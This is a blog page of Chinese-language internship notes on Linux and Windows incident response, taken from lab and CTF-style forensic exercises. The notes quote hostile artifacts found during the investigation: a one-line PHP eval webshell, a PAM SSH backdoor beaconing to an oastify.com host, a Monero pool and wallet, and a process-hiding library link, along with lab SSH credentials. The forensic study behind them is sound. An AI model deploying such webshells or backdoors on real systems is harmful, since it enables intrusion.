+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment">#安装</span><br>yum install -y clamav<br><span class="hljs-comment">#更新病毒库</span><br>freshclam<br><span class="hljs-comment">#扫描方法</span><br>clamscan -r <span class="hljs-string">/etc</span> <span class="hljs-params">--max-dir-recursion=5</span> -l <span class="hljs-string">/root/etcclamav.log</span><br>clamscan -r <span class="hljs-string">/bin</span> <span class="hljs-params">--max-dir-recursion=5</span> -l <span class="hljs-string">/root/binclamav.log</span><br>clamscan -r <span class="hljs-string">/usr</span> <span class="hljs-params">--max-dir-recursion=5</span> -l <span class="hljs-string">/root/usrclamav.log</span><br><span class="hljs-comment">#扫描并杀毒</span><br>clamscan -r  <span class="hljs-params">--remove</span>  <span class="hljs-string">/usr/bin/bsd-port</span><br>clamscan -r  <span class="hljs-params">--remove</span>  <span class="hljs-string">/usr/bin/</span><br>clamscan -r <span class="hljs-params">--remove</span>  <span class="hljs-string">/usr/local/zabbix/sbin</span><br><span class="hljs-comment">#查看日志发现</span><br>cat <span class="hljs-string">/root/usrclamav.log</span> |grep FOUND<br></code></pre></td></tr></table></figure>
+<h5 id="RPM-check-检查"><a href="#RPM-check-检查" class="headerlink" title="RPM check 检查"></a>RPM check 检查</h5><p>可以使用<code>whereis 命令名称</code>查看命令使用软件包的位置，黑客可以定制其他软件包替换掉该命令，从而实现隐藏自身行为的目的(隐藏进程、隐藏端口、隐藏文件)</p>
+<p>系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了<code>rpm -Va &gt; rpm.log</code><br>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css">验证内容中的<span class="hljs-number">8</span>个信息的具体内容如下：<br>		S         文件大小是否改变<br>		M         文件的类型或文件的权限（rwx）是否被改变<br>		<span class="hljs-number">5</span>         文件MD5校验是否改变（可以看成文件内容是否改变）<br>		D         设备中，从代码是否改变<br>		L         文件路径是否改变<br>		U         文件的属主（所有者）是否改变<br>		<span class="hljs-selector-tag">G</span>         文件的属组是否改变<br>		T         文件的修改时间是否改变<br></code></pre></td></tr></table></figure>
+<p>如果命令被替换了，如何还原：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">文件提取还原案例：<br>rpm  -qf /bin/ls  查询 <span class="hljs-built_in">ls</span> 命令属于哪个软件包<br><span class="hljs-built_in">mv</span>  /bin/ls /tmp  先把 <span class="hljs-built_in">ls</span> 转移到 tmp 目录下，造成 <span class="hljs-built_in">ls</span> 命令丢失的假象<br>rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取 rpm 包中 <span class="hljs-built_in">ls</span> 命令到当前目录的 /bin/ls 下<br><span class="hljs-built_in">cp</span> /root/bin/ls  /bin/ 把 <span class="hljs-built_in">ls</span> 命令复制到 /bin/ 目录 修复文件丢失<br></code></pre></td></tr></table></figure>
+
+<h4 id="Linux后门"><a href="#Linux后门" class="headerlink" title="Linux后门"></a>Linux后门</h4><h5 id="PAM后门"><a href="#PAM后门" class="headerlink" title="PAM后门"></a>PAM后门</h5><h4 id="下午：应急响应实操练习-1"><a href="#下午：应急响应实操练习-1" class="headerlink" title="下午：应急响应实操练习"></a>下午：应急响应实操练习</h4><p>每组一个Linux虚拟机，虚拟机SSH密码：root&#x2F;Abc@12345<br>Group1 10.100.2.58<br>Group2 10.100.2.80<br>Group3 10.100.2.82<br>Group4 10.100.2.83<br>Group5 10.100.2.84<br>Group6 10.100.2.86<br>Group7 10.100.2.87<br>Group8 10.100.2.88<br>Group9 10.100.2.89</p>
+<p>场景：服务器被植入挖矿病毒场景 WEBLOGIC<br>模拟应用系统存在漏洞，黑客组织利用应用系统存在漏洞，成功获取到服务器的管理权限，植入挖矿病毒、消耗服务器资源、严重影响应用系统正常运行。为避免影响面扩大、造成应用服务不可用的情况，信息安全管理部立即启动应急事件响应流程，组织安全技术人员开展安全事件应急处置。</p>
+<p><code>weblogic默认后台登录页面在&#39;域名/console&#39;</code><br>1.请提交WEblogic控制台口令：</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gradle">使用ps aux | <span class="hljs-keyword">grep</span> weblogic查看weblogin安装目录<br>WebLogic安装在<span class="hljs-regexp">/home/</span>weblogic<span class="hljs-regexp">/Oracle/Mi</span>ddleware下<br>域目录位于<span class="hljs-regexp">/home/</span>weblogic<span class="hljs-regexp">/Oracle/Mi</span>ddleware<span class="hljs-regexp">/user_projects/</span>domains/hnyd_domain<br><br>则密码文件可能位置：<br><span class="hljs-regexp">/home/</span>weblogic<span class="hljs-regexp">/Oracle/Mi</span>ddleware<span class="hljs-regexp">/user_projects/</span>domains<span class="hljs-regexp">/hnyd_domain/</span>config/config.xml<br><span class="hljs-regexp">/home/</span>weblogic<span class="hljs-regexp">/Oracle/Mi</span>ddleware<span class="hljs-regexp">/user_projects/</span>domains<span class="hljs-regexp">/hnyd_domain/</span>servers<span class="hljs-regexp">/AdminServer/</span>security/boot.properties<br><br>密钥文件位置：<br><span class="hljs-regexp">/home/</span>weblogic<span class="hljs-regexp">/Oracle/Mi</span>ddleware<span class="hljs-regexp">/user_projects/</span>domains<span class="hljs-regexp">/hnyd_domain/</span>security/SerializedSystemIni.dat<br><br>使用weblogic解密工具进行解密得到用户名和密码：weblogic/Weblogic@<span class="hljs-number">123</span><br>如果无法解密：将bcprov-jdk15on-<span class="hljs-number">1.69</span>.jar放入到C:\Program Files\Java\jre1.<span class="hljs-number">8.0</span>_361\lib\ext目录下<br></code></pre></td></tr></table></figure>
+<p>2.请提交黑客利用漏洞的CVE编号：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">WebLogic漏洞利用工具：Java.V1.<span class="hljs-number">7</span><br>CVE-<span class="hljs-number">2017</span>-<span class="hljs-number">10271</span><br><br>Oracle产品安全更新页面：https:<span class="hljs-regexp">//</span>www.oracle.com<span class="hljs-regexp">/security-alerts/</span><br>https:<span class="hljs-regexp">//</span>www.oracle.com<span class="hljs-regexp">/security-alerts/</span>cpuapr2024.html<br></code></pre></td></tr></table></figure>
+<p>3.请提交Webshell绝对路径：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">使用河马工具扫描目录<span class="hljs-regexp">/home/</span>weblogic<span class="hljs-regexp">/Oracle/</span>Middleware<span class="hljs-regexp">/user_projects/</span>domains/hnyd_domain<br>发现木马位于<span class="hljs-regexp">/home/</span>weblogic<span class="hljs-regexp">/Oracle/</span>Middleware<span class="hljs-regexp">/user_projects/</span>domains<span class="hljs-regexp">/hnyd_domain/</span>servers<span class="hljs-regexp">/AdminServer/</span>tmp<span class="hljs-regexp">/_WL_internal/</span>wls-wsat<span class="hljs-regexp">/54p17w/</span>war/shell.jsp<br>则webshell访问地址：http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">116.128</span><span class="hljs-regexp">/wls-wsat/</span>shell.jsp<br></code></pre></td></tr></table></figure>
+<p>4.挖矿木马路径:</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-number">1</span>）安装<span class="hljs-keyword">unhide</span>查找隐藏进程：yum install <span class="hljs-keyword">unhide</span> -<span class="hljs-keyword">y</span><br>运行<span class="hljs-keyword">unhide</span> brute找到隐藏挖矿进程/usr/sbin/tcpc<br><span class="hljs-number">2</span>）查找<span class="hljs-number">2022</span>年<span class="hljs-number">6</span>月<span class="hljs-number">9</span>日服务器上新增的文件<br><span class="hljs-keyword">find</span> / -<span class="hljs-built_in">type</span> <span class="hljs-keyword">f</span> -newermt <span class="hljs-number">2022</span>-<span class="hljs-number">06</span>-<span class="hljs-number">09</span> ! -newermt <span class="hljs-number">2022</span>-<span class="hljs-number">06</span>-<span class="hljs-number">10</span><br>既可找到挖矿木马/usr/sbin/tcpc，也可以找到webshell<br><br>进程隐藏的关键文件：/usr/local/lib/libprocess.<span class="hljs-keyword">so</span> (可使用ida打开进行分析)<br>进程隐藏的实现代码：https://github.<span class="hljs-keyword">com</span>/gianlucaborello/libprocesshider<br></code></pre></td></tr></table></figure>
+<p>5.挖矿木马矿池地址及钱包地址是：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">找到挖矿木马的配置文件并查看cat /usr/sbin/config<span class="hljs-selector-class">.json</span><br>矿池：pool<span class="hljs-selector-class">.supportxmr</span><span class="hljs-selector-class">.com</span><br>钱包地址：<span class="hljs-number">4</span>AxR3o8RdDvKguYwCvmeV2AfVtnzX3bkvTpeZqqFgYr9czmPwbUVirKQWvviGpEquyjQLdqF1yKh31oFHs4iefFiR1jK1NA<br>门罗币：相较于比特币更加安全，自己的门罗币资产数额对外不可见，而且挖矿要求的配置较低，个人pc也能挖到矿<br></code></pre></td></tr></table></figure>
+<h3 id="7-17"><a href="#7-17" class="headerlink" title="7.17"></a>7.17</h3><h4 id="Windows入侵检测"><a href="#Windows入侵检测" class="headerlink" title="Windows入侵检测"></a>Windows入侵检测</h4><p><a target="_blank" rel="noopener" href="https://www.yuque.com/u22103703/csqb9v/rci4g8">雨雀</a><br>常见的应急响应事件分类：<br>Web 入侵：网页挂马、主页篡改、Webshell<br>系统入侵：病毒木马、勒索软件、远控后门<br>网络攻击：DDOS 攻击、DNS 劫持、ARP 欺骗</p>
+<h5 id="入侵检测思路"><a href="#入侵检测思路" class="headerlink" title="入侵检测思路"></a>入侵检测思路</h5><ul>
+<li>查看隐藏账号<br>  带有$结尾的用户名会被net user隐藏，一般用于隐藏账号，可以使用D盾的扫描</li>
+<li>查看可疑端口，检查端口连接情况，是否有可疑连接<ul>
+<li>端口-PID：netstat -ano</li>
+<li>PDI-进程：tasklist | findstr “PID”</li>
+</ul>
+</li>
+<li>查看可疑进程<ul>
+<li>开始 – 运行 – 输入 msinfo32 命令，依次点击 “软件环境 – 正在运行任务” 就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期以及启动时间等</li>
+<li>打开D盾web查杀工具，进程查看，关注没有签名信息的进程</li>
+<li>通过微软官方提供的 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">Process Explorer</a> 等工具进行排查，可以以树状图的结构查看进程之间的关系，从而找出进程启动的因果关系</li>
+<li>查看可疑的进程及其子进程。可以通过观察以下内容</li>
+</ul>
+</li>
+</ul>
+<h6 id="检查启动项、计划任务、服务"><a href="#检查启动项、计划任务、服务" class="headerlink" title="检查启动项、计划任务、服务"></a>检查启动项、计划任务、服务</h6><p>恶意软件为保证用户关机后重启依然能够运行，一定会做持久化操作；启动项、计划任务、服务三者的本质是注册表<br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/autoruns">autoruns</a></p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">可以发现windows上任何进程，重点关注启动项(Logon)、计划任务(Scheduled Tasks)、服务(Services)<br>可以关注条目的签名，木马程序通常没有数字签名，描述（Description）和发行者（Publisher）字段为空的项<br>可以右键条目点击Check VirusTotal在VirusTotal在线检测条目<br></code></pre></td></tr></table></figure>
+<h6 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h6><p><a target="_blank" rel="noopener" href="https://www.nirsoft.net/utils/windows_log_on_times_view.html">winlogonview</a><br><a target="_blank" rel="noopener" href="https://www.nirsoft.net/utils/winlogonview.zip">下载地址</a><br><a target="_blank" rel="noopener" href="https://www.nirsoft.net/utils/trans/winlogonview_schinese.zip">汉化包</a><br>winlogonview除了图形界面，也可以在命令行中使用<code>WinLogOnView.exe /shtml &quot;f:\temp\logon.html&quot; /sort &quot;User Name&quot; /sort &quot;Logon Time&quot;</code>查看windows系统登录记录</p>
+<h5 id="挖矿木马"><a href="#挖矿木马" class="headerlink" title="挖矿木马"></a>挖矿木马</h5><p>xmrig：开源挖矿程序<br><a target="_blank" rel="noopener" href="https://xmrig.com/">官网</a><br><a target="_blank" rel="noopener" href="https://github.com/xmrig/xmrig">github项目地址</a></p>
+<ul>
+<li>静态分析配置文件<ul>
+<li>config.json</li>
+<li>参数方式：xmrig -o 矿池地址-u 钱包地址 -k -p x</li>
+<li>内嵌配置：可使用strings命令行分析</li>
+<li>静态分析可以分析出矿池地址&#x2F;挖矿代理服务器、钱包地址等信息</li>
+<li>钱包地址为4或8开头的95位长类似base64编码字符串（实际为base58编码）</li>
+</ul>
+</li>
+<li>动态分析<ul>
+<li>CPU占用率</li>
+<li>连接矿池域名：supportxmr&#x2F;minexmr&#x2F;nanopool</li>
+<li>异常通信端口：3333&#x2F;5555&#x2F;7777等</li>
+</ul>
+</li>
+</ul>
+<h3 id="7-18"><a href="#7-18" class="headerlink" title="7.18"></a>7.18</h3><h4 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h4><p><a target="_blank" rel="noopener" href="https://www.yuque.com/u22103703/hu2c81/qcvqmq">雨雀</a><br>一般情况下，非HTTP协议的网络分析，在服务器端用tcpdump比较多，在客户端用wireshark比较多，两个抓包软件的语法是一样的。<br>wireshark本身不具有任何攻击行为，只会完整地记录网络流量<br>windows默认情况下不开启混杂模式，而linux可以手动开启混杂模式<br>由于wifi设置了密码，流量进行了加密，即使抓到了局域网下其他主机的数据包，黑客也无法分析<br>但如果wifi没有密码，黑客则可以轻易获取并分析局域网下的流量</p>
+<p>ping的发送端和接收端icmp数据可以自定义，所以可以利用此特点实现icmp木马，例如发送端icmp数据是执行命令<code>whoami</code>，接收端icmp数据是返回命令<code>whoami</code>的结果<br><code>统计-&gt;协议分级</code>猜测出题者意图想要考察什么协议</p>
+<p>tcpdump是linux的流量分析工具，只能抓取流经本机的数据包<br>可以使用tcpdump验证某些漏洞的存在性<br>可以在靶机运行tcpdump从而捕获网站管理员密码</p>
+<ul>
+<li>wifi.pcap<br><a target="_blank" rel="noopener" href="https://www.aircrack-ng.org/">aircrack-WIFI破解工具</a><br><a target="_blank" rel="noopener" href="https://download.aircrack-ng.org/aircrack-ng-1.7-win.zip">win版本下载地址</a><br>使用aircrack-ng破解wifi密码为syc19940222<br>编辑–首选项–Protocols–IEEE 802.11<br>Decryption keys–Edit– +号 – wpa-pwd（key type） syc19940222 (key value) -&gt; 确定 -&gt; 勾选Enable Decryption -&gt; 确定<br>解密之前统计协议分级都为IEEE 802.11,解密后已经能看到IPv4和IPv6协议的报文了</li>
+</ul>
+<h4 id="下午："><a href="#下午：" class="headerlink" title="下午："></a>下午：</h4><p>应急响应</p>
+<ol>
+<li>攻击者的IP：<br><code>192.168.3.62</code></li>
+<li>注入点工具的版本：<br><code>sqlmap1.5.8</code></li>
+<li>当前数据库名称：<br><code>datacolldb</code></li>
+<li>登录后台的密码<br><code>AAA111222333</code></li>
+<li>上传的Webshell文件名<br><code>6376594230979350942088218.aspx</code></li>
+<li>数据库的密码<br><code>datacolldbo2020</code></li>
+<li>提权工具的名称<br><code>ms16-032_x64.exe</code></li>
+<li>获取的管理员的密码<br><code>rzx@1218</code></li>
+<li>拿到的机密文件的文件内容<br><code>flag&#123;ba3d384b-83dc-49df-a964-f68793c3c877&#125;</code></li>
+</ol>
+<h3 id="7-19"><a href="#7-19" class="headerlink" title="7.19"></a>7.19</h3><p>（本题环境为1-9题题干）模拟某公司门户网站系统存在某高危漏洞，黑客组织利用网站系统存在的漏洞，成功获取到网站的管理权限，信息安全管理部立即启动应急事件响应流程，组织安全技术人员开展安全事件应急处置。注意：10.100.0.37虚拟机SSH登录密码：root&#x2F;Abc@12345(50分)</p>
+<ol>
+<li>第一题：黑客使用的SQL注入工具是（小写） <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">cd</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/httpd<br><span class="hljs-keyword">cat</span> access_log-20240718 | grep sqlmap<br></code></pre></td></tr></table></figure></li>
+<li>黑客使用的SQL注入工具版本（如1.1.1）<br><code>cat access_log-20240718 | grep sqlmap</code><br><code>sqlmap/1.5.8</code></li>
+<li>webshell <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat access_log-<span class="hljs-number">20240718</span><br><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/u</span>pload<span class="hljs-regexp">/img/</span><span class="hljs-number">20121208</span>/<span class="hljs-number">201212082353104864</span>.php<br></code></pre></td></tr></table></figure></li>
+<li>webshell密码<br><code>cat /var/www/html/upload/img/20121208/201212082353104864.php</code><br><code>&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;</code></li>
+<li>提取工具路径<br><code>/var/www/html/upload/exploit_defaults_mailer.py</code></li>
+<li>黑客修改的网页<br><code>grep -r github.com *</code><br><code>/var/www/html/template/default/index.html</code></li>
+<li>CVE<br><code>cat /var/www/html/upload/exploit_defaults_mailer.py</code><br><code>cve-2021-3156</code></li>
+<li>ssh后门文件<br><code>cat /etc/pam.d/sshd</code><br><code>发现so文件pam_login_linux.so</code></li>
+<li>ssh的C2地址</li>
+</ol>
+<ul>
+<li>ida分析<br><code>用ida64打开pam_login_linux.so分析</code><br><code>在send_message()函数中发现向wnn0sum8iig0psw28vmlnonqbhh75w.oastify.com发送报文</code></li>
+<li>网路流量抓包<br><code>在服务器上使用 tcpdump -i 网卡名称 监听网卡流量</code><br><code>使用ssh连接服务器触发pam_login_linux.so</code><br><code>下载tcpdump抓到的pcap文件用wireshark分析，筛选dns数据包可以发现域名解析中有wnn0sum8iig0psw28vmlnonqbhh75w.oastify.com</code></li>
+<li>strings<br><code>使用strings提取so文件中的关键字符串也能看到一些线索，去掉每行最后的H再做调整</code>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell">https://<span class="hljs-built_in">H</span><br>wnn0sum8<span class="hljs-built_in">H</span><br>iig0psw2<span class="hljs-built_in">H</span><br><span class="hljs-number">8</span>vmlnonqH<br>bhh75w.oH<br>astify.cH<br>@<span class="hljs-number">0</span>om<br></code></pre></td></tr></table></figure></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>雨笋实习笔记</div>
+      <div>http://example.com/2024/10/10/yusun/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Feaster</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 10, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/10/10/hello-world/" title="Hello World">
+                        <span class="hidden-mobile">Hello World</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
